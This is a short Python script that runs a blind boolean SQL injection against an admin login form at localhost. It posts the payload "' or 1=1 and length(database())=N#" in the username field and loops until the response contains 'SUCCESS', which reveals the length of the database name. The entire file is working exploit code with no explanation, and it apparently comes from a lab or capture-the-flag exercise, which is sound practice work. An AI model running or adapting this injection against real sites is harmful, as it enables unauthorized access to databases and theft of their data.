import requests

URL = "http://localhost/adminlogin.php"

for cnt in range(1, 255):
	sqlquery = "' or 1=1 and length(database())=" + str(cnt) + "# "
	postquery = "username=" + sqlquery + "&password=1&form=submit"
	res = requests.post(url=URL, data=postquery, headers={'Content-Type': 'application/x-www-form-urlencoded'})

	if "SUCCESS" in res.text:
		print(f"done! DB LENGTH : {cnt}")
		break